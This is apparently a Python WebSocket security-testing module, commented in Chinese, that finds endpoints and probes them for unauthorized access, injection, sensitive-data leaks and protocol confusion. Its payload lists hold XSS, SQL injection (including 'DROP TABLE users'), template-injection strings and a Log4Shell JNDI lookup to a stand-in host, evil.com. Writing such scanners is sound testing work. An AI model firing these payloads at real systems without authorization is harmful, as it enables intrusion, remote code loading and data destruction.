"""
WebSocket Security Tester
WebSocket 安全测试模块

测试能力：
1. WebSocket连接发现与验证
2. 未授权访问测试
3. 消息注入测试
4. 订阅者隔离测试
5. 跨协议攻击测试
"""

import asyncio
import json
import logging
import re
import time
from typing import Dict, List, Optional, Any, Set
from dataclasses import dataclass
from enum import Enum
from urllib.parse import urlparse

logger = logging.getLogger(__name__)


class WebSocketVulnerabilityType(Enum):
    """WebSocket漏洞类型"""
    UNAUTHORIZED_ACCESS = "unauthorized_access"
    MESSAGE_INJECTION = "message_injection"
    SUBSCRIBER_ISOLATION = "subscriber_isolation"
    CSRF_WEBSOCKET = "csrf_websocket"
    DOS_WEBSOCKET = "dos_websocket"
    SENSITIVE_DATA_EXPOSURE = "sensitive_data_exposure"
    PROTOCOL_CONFUSION = "protocol_confusion"


@dataclass
class WebSocketTestResult:
    """WebSocket测试结果"""
    endpoint: str
    connected: bool
    vulnerabilities: List[Dict[str, Any]]
    messages_sent: int
    messages_received: int
    error_message: Optional[str] = None


@dataclass
class WebSocketVulnerability:
    """WebSocket漏洞"""
    vulnerability_type: WebSocketVulnerabilityType
    severity: str  # critical, high, medium, low, info
    description: str
    evidence: str
    remediation: str
    test_payload: Optional[str] = None


class WebSocketTester:
    """
    WebSocket安全测试器
    
    支持的测试场景：
    1. 连接测试 - 验证WebSocket端点可访问性
    2. 未授权访问 - 无认证建立连接
    3. 消息注入 - 发送恶意消息测试服务处理
    4. 订阅者隔离 - 测试不同用户间的数据隔离
    5. 敏感数据暴露 - 检测响应中的敏感信息
    6. 协议混淆 - 测试服务端协议处理
    """

    WS_COMMON_PATHS = [
        '/ws',
        '/websocket',
        '/ws/',
        '/socket',
        '/socket.io',
        '/chat',
        '/live',
        '/realtime',
        '/events',
        '/api/ws',
        '/api/websocket',
    ]

    AUTH_BYPASS_HEADERS = [
        {'Cookie': 'token=admin'},
        {'Cookie': 'session=admin'},
        {'X-User-ID': '1'},
        {'X-Admin': '1'},
        {'Authorization': 'Bearer admin'},
    ]

    INJECTION_PAYLOADS = [
        {"message": "<script>alert(1)</script>"},
        {"message": "'; DROP TABLE users; --"},
        {"message": "${7*7}"},
        {"message": "{{7*7}}"},
        {"message": "${jndi:ldap://evil.com/a}"},
        {"message": "{{constructor.constructor('alert(1)')()}}"},
    ]

    def __init__(self, http_client=None):
        self.http_client = http_client
        self.results: List[WebSocketTestResult] = []

    async def test_websocket_endpoint(
        self,
        url: str,
        auth_token: Optional[str] = None,
        cookies: Optional[str] = None
    ) -> WebSocketTestResult:
        """
        测试WebSocket端点
        
        Args:
            url: WebSocket URL (ws:// 或 wss://)
            auth_token: 认证Token
            cookies: Cookie字符串
            
        Returns:
            WebSocketTestResult
        """
        result = WebSocketTestResult(
            endpoint=url,
            connected=False,
            vulnerabilities=[],
            messages_sent=0,
            messages_received=0
        )

        if not self.http_client:
            try:
                import aiohttp
            except ImportError:
                result.error_message = "aiohttp not available"
                return result

        try:
            connected = await self._connect_websocket(url, auth_token, cookies)
            result.connected = connected

            if not connected:
                result.error_message = "Failed to establish WebSocket connection"
                return result

            await self._test_unauthorized_access(url, result)

            await self._test_message_injection(url, result)

            await self._test_sensitive_data_exposure(url, result)

            await self._test_protocol_confusion(url, result)

        except Exception as e:
            result.error_message = str(e)
            logger.debug(f"WebSocket test error for {url}: {e}")

        self.results.append(result)
        return result

    async def _connect_websocket(
        self,
        url: str,
        auth_token: Optional[str] = None,
        cookies: Optional[str] = None
    ) -> bool:
        """建立WebSocket连接"""
        try:
            import aiohttp

            headers = {}
            if auth_token:
                headers['Authorization'] = f'Bearer {auth_token}'
            if cookies:
                headers['Cookie'] = cookies

            timeout = aiohttp.ClientTimeout(total=10)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.ws_connect(url, headers=headers) as ws:
                    await ws.send_str('{"type":"ping"}')
                    try:
                        msg = await asyncio.wait_for(ws.receive(), timeout=5)
                        return msg.type == aiohttp.WSMsgType.TEXT or msg.type == aiohttp.WSMsgType.PONG
                    except asyncio.TimeoutError:
                        return True

        except Exception as e:
            logger.debug(f"WebSocket connection failed for {url}: {e}")
            return False

    async def _test_unauthorized_access(self, url: str, result: WebSocketTestResult):
        """测试未授权访问"""
        for header_set in self.AUTH_BYPASS_HEADERS:
            try:
                import aiohttp

                timeout = aiohttp.ClientTimeout(total=10)
                async with aiohttp.ClientSession(timeout=timeout) as session:
                    async with session.ws_connect(url, headers=header_set) as ws:
                        await ws.send_str('{"type":"auth_test"}')
                        start_time = time.time()

                        try:
                            msg = await asyncio.wait_for(ws.receive(), timeout=5)
                            elapsed = time.time() - start_time

                            if msg.type == aiohttp.WSMsgType.TEXT:
                                content = msg.data

                                if 'admin' in content.lower() or 'dashboard' in content.lower():
                                    result.vulnerabilities.append({
                                        'type': WebSocketVulnerabilityType.UNAUTHORIZED_ACCESS.value,
                                        'severity': 'high',
                                        'description': 'WebSocket endpoint allows unauthorized access',
                                        'evidence': f'Received admin/dashboard data with header: {list(header_set.keys())}',
                                        'remediation': 'Implement proper authentication for WebSocket connections'
                                    })
                                    break

                                result.messages_received += 1
                        except asyncio.TimeoutError:
                            pass

            except Exception as e:
                logger.debug(f"Unauthorized access test failed: {e}")

    async def _test_message_injection(self, url: str, result: WebSocketTestResult):
        """测试消息注入"""
        xss_payloads = [
            '<script>alert(1)</script>',
            '";alert(1);"',
            "';alert(1);//",
        ]

        sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1 --",
            "admin'--",
        ]

        ssti_payloads = [
            "{{7*7}}",
            "${7*7}",
            "{{constructor.constructor('alert(1)')()}}",
        ]

        all_payloads = {
            'xss': xss_payloads,
            'sqli': sqli_payloads,
            'ssti': ssti_payloads
        }

        for ptype, payloads in all_payloads.items():
            for payload in payloads:
                try:
                    import aiohttp

                    timeout = aiohttp.ClientTimeout(total=10)
                    async with aiohttp.ClientSession(timeout=timeout) as session:
                        async with session.ws_connect(url) as ws:
                            test_msg = json.dumps({'message': payload, 'type': 'test'})
                            await ws.send_str(test_msg)
                            result.messages_sent += 1

                            try:
                                msg = await asyncio.wait_for(ws.receive(), timeout=5)
                                if msg.type == aiohttp.WSMsgType.TEXT:
                                    result.messages_received += 1
                                    content = msg.data

                                    if payload in content and payload not in ['{{7*7}}', '${7*7}']:
                                        result.vulnerabilities.append({
                                            'type': WebSocketVulnerabilityType.MESSAGE_INJECTION.value,
                                            'severity': 'high',
                                            'description': f'Potential {ptype.upper()} injection via WebSocket',
                                            'evidence': f'Payload reflected in response: {payload[:50]}',
                                            'remediation': f'Sanitize and validate {ptype.upper()} input in WebSocket messages'
                                        })
                                        break

                            except asyncio.TimeoutError:
                                pass

                except Exception as e:
                    logger.debug(f"Message injection test failed: {e}")

    async def _test_sensitive_data_exposure(self, url: str, result: WebSocketTestResult):
        """测试敏感数据暴露"""
        sensitive_patterns = [
            (r'\b\d{16}\b', 'Credit Card'),
            (r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', 'Email'),
            (r'password["\s]*:["\s]*[^"^\}]+', 'Password'),
            (r'api[_-]?key["\s]*:["\s]*[^"^\}]+', 'API Key'),
            (r'token["\s]*:["\s]*[^"^\}]+', 'Token'),
            (r'secret["\s]*:["\s]*[^"^\}]+', 'Secret'),
            (r'jwt["\s]*:["\s]*[^"^\}]+', 'JWT'),
            (r'bearer["\s]*:["\s]*[^"^\}]+', 'Bearer Token'),
        ]

        try:
            import aiohttp

            timeout = aiohttp.ClientTimeout(total=10)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.ws_connect(url) as ws:
                    await ws.send_str('{"type":"get_profile"}')
                    result.messages_sent += 1

                    try:
                        msg = await asyncio.wait_for(ws.receive(), timeout=5)
                        if msg.type == aiohttp.WSMsgType.TEXT:
                            result.messages_received += 1
                            content = msg.data

                            for pattern, ptype in sensitive_patterns:
                                matches = re.findall(pattern, content, re.IGNORECASE)
                                if matches:
                                    result.vulnerabilities.append({
                                        'type': WebSocketVulnerabilityType.SENSITIVE_DATA_EXPOSURE.value,
                                        'severity': 'medium',
                                        'description': f'Sensitive data exposure: {ptype}',
                                        'evidence': f'Found {len(matches)} {ptype} reference(s) in response',
                                        'remediation': 'Implement proper access controls and data masking'
                                    })
                                    break

                    except asyncio.TimeoutError:
                        pass

        except Exception as e:
            logger.debug(f"Sensitive data test failed: {e}")

    async def _test_protocol_confusion(self, url: str, result: WebSocketTestResult):
        """测试协议混淆攻击"""
        protocols = [
            {'Sec-WebSocket-Protocol': 'graphql-ws'},
            {'Sec-WebSocket-Protocol': 'mqtt'},
            {'Sec-WebSocket-Protocol': 'STOMP'},
        ]

        for header_set in protocols:
            try:
                import aiohttp

                timeout = aiohttp.ClientTimeout(total=10)
                async with aiohttp.ClientSession(timeout=timeout) as session:
                    async with session.ws_connect(url, headers=header_set) as ws:
                        await ws.send_str('{"type":"protocol_test"}')
                        result.messages_sent += 1

                        try:
                            msg = await asyncio.wait_for(ws.receive(), timeout=3)
                            if msg.type == aiohttp.WSMsgType.TEXT:
                                result.messages_received += 1

                                if 'graphql' in header_set.get('Sec-WebSocket-Protocol', '').lower():
                                    if 'errors' not in msg.data.lower():
                                        result.vulnerabilities.append({
                                            'type': WebSocketVulnerabilityType.PROTOCOL_CONFUSION.value,
                                            'severity': 'medium',
                                            'description': 'Server accepts unexpected protocol',
                                            'evidence': f'Server responded to {header_set.get("Sec-WebSocket-Protocol")} protocol',
                                            'remediation': 'Validate and enforce protocol expectations'
                                        })

                        except asyncio.TimeoutError:
                            pass

            except Exception as e:
                logger.debug(f"Protocol confusion test failed: {e}")

    async def discover_websocket_endpoints(
        self,
        base_url: str,
        http_client=None
    ) -> List[str]:
        """
        发现WebSocket端点
        
        Args:
            base_url: 目标基础URL
            http_client: HTTP客户端
            
        Returns:
            发现的WebSocket端点列表
        """
        endpoints = []
        parsed = urlparse(base_url)
        ws_base = f"ws://{parsed.netloc}" if not base_url.startswith('wss') else f"wss://{parsed.netloc}"

        for path in self.WS_COMMON_PATHS:
            ws_url = f"{ws_base}{path}"
            if await self._test_connection(ws_url):
                endpoints.append(ws_url)

        return endpoints

    async def _test_connection(self, url: str) -> bool:
        """测试WebSocket连接"""
        try:
            import aiohttp

            timeout = aiohttp.ClientTimeout(total=5)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.ws_connect(url) as ws:
                    return True

        except Exception:
            return False

    def get_results(self) -> List[WebSocketTestResult]:
        """获取所有测试结果"""
        return self.results


async def test_websocket(url: str, http_client=None) -> WebSocketTestResult:
    """便捷函数：测试单个WebSocket端点"""
    tester = WebSocketTester(http_client)
    return await tester.test_websocket_endpoint(url)
